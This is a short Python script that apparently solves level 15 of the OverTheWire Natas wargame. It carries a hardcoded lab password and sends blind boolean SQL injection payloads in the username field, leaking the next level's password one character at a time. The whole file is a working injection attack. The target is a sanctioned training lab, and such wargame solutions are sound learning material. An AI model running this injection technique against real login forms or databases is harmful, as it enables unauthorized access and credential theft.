#!/usr/bin/python
import requests
from string import *

username = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
url = f'http://{username}.natas.labs.overthewire.org/'

characters = ascii_letters + digits
leakedpassword = []
while True:
	found = False
	for ch in characters:
		attempt = ''.join(leakedpassword) + ch
		sql = f'natas16" AND BINARY password LIKE "{attempt}%" #'
		response = requests.post(url, data = {"username": sql}, auth = (username, password))
		if 'user exist' in response.text:
			leakedpassword.append(ch)
			print("".join(leakedpassword))
			found = True

	if not found:
		break
	
